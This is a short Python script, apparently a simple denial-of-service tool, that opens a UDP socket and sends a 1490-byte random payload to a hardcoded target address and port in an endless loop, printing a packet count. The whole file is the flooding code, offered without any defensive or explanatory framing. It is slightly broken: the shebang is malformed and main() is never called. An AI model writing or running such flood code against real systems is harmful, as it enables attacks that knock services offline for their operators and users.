#! usr/bin/env python
#Libs
import sys, os
import random
import socket
from datetime import datetime

#System Comands
os.system("clear")

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Bytes Random
bytes = random._urandom(1490)

#Main
def main():
	Alvo = "127.0.0.1"
	Port = 1
	sent = 0
	#time = sys.argv[3]
	while True:
		s.sendto(bytes,(Alvo,Port))
		sent = sent + 1
		#tam = str("{} kb/s".format(len(sent)))
		print ("Sending:{} Packets to:{} Throught Port:{}".format(sent, Alvo, Port))
